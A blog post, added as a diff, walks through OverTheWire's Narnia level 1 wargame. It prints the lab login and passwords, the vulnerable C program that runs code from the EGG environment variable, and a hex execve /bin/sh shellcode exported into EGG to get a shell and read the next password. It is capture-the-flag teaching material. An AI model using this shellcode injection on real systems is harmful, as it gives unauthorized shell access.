@@ -1,0 +1,55 @@
+---
+layout: post
+title:  "Narnia Level 1"
+date:   2015-10-02 12:52
+categories: narnia wargame pwnable overthewire
+author: Leander
+---
+
+This is a solution guide to the Narnia1 Level at [overthewire](http://overthewire.org/wargames/narnia/) This write-up was first created on 27 February 2015.
+<!--break-->
+
+First connect to the lab
+<ul><li>ssh narnia1@narnia.labs.overthewire.org</li>
+<li>Enter the following as the password efeidiedae</li></ul>
+
+Change directories to the narnia games folder `cd /narnia`. Next, let's examine how we get the password for the next level `less narnia1.c`.
+
+{% highlight c linenos %}
+int main(){
+        int (*ret)();
+
+        if(getenv("EGG")==NULL){    
+                printf("Give me something to execute at the env-variable EGG\n");
+                exit(1);
+        }
+
+        printf("Trying to execute EGG!\n");
+        ret = getenv("EGG");
+        ret();
+
+        return 0;
+}
+{% endhighlight %}
+
+So this seems to be a pretty easy challenge. When we examine the source code we can see that the first thing that occurs is that a void pointer is created. Next, there are two functions that get an environment variable called "EGG" and if the "EGG" environment variable exists then it retrieves the pointer to that environment variable and stores it in ret. Last it will execute whatever "EGG" is pointing to as a function call. Essentially, it will attempt to execute anything that is placed in "EGG".
+
+So the first step is to grab some shellcode from [shell-storm](http://shell-storm.org/shellcode/files/shellcode-811.php) Next, we grab all the bytes and place them into the "EGG" environment variable:
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">export EGG=`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80"'`</code></pre></figure>
+
+Third, we run the vulnerable program with `./narnia1` and check that out. Now we have a shell!
+
+Let's doublecheck our creds with `whoami` and we get:
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ whoami
+narnia2
+$ </code></pre></figure>
+
+So now we can retrieve our password like so:
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ cat /etc/narnia_pass/narnia2
+nairiepecu
+$</code></pre></figure>
+
+BINGO! level 2 password is ```nairiepecu```
